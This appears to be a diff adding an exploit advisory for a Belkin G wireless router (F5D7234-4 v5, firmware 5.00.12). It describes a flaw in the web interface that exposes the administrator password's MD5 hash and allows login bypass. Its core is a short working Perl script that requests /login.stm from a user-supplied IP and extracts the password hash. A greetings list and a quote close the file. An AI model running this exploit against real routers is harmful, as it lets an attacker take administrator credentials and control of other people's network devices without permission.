@@ -1,0 +1,56 @@
++-----------------------------------------+
+| Belkin G Wireless Router Admin Exploit. |
++-----------------------------------------+
+
+Firmware Version : 5.00.12 (Sep 10 2009 19:54:12)
+Boot Version     : 1.18
+Hardware         : F5D7234-4 v5 (01)
+Author           : Aodrulez.
+Email            : f3arm3d3ar@gmail.com
+Twitter          : http://twitter.com/Aodrulez
+
+
++---------+
+| Details |
++---------+
+
+The router's web interface reveals the Administrator Password's
+MD5 Hash. Its even possbile to bypass the login completely.
+
+
++---------+
+| Exploit |
++---------+
+
+#/usr/bin/perl
+use LWP::Simple;
+print "\n Aodrulez's 'Belkin G Wireless Router' Admin Exploit\n";
+print "\n ---------------------------------------------------\n\n";
+print "[+] Enter the Router's IP Address : ";
+my $password=<STDIN>;
+chomp($password);
+$password=get("http://".$password."/login.stm") or die "\n[!] Wrong IP Address?\n";
+my @aod=$password =~ m/var password = "(.*)";/g;
+print "[+] Admin Password = ".@aod[0]." (MD5 Hash).\n\n";
+
+
+
++-------------------+
+| Greetz Fly Out To |
++-------------------+
+    
+   
+1] Amforked()          : My Mentor.
+2] The Blue Genius     : My Boss.
+3] str0ke (milw0rm)
+4] www.orchidseven.com
+5] www.malcon.org
+6] www.isac.org.in
+  
+  
++-------+
+| Quote |
++-------+
+  
+"Music is my Religion & Jimmy Page, my GOD." - Aodrulez
+
